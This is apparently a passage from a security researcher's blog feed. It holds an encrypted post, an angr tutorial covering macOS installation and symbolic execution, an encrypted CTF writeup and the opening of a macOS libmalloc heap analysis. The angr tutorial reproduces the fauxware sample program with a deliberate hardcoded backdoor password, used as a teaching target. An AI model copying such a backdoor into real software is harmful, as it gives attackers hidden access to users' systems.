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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void 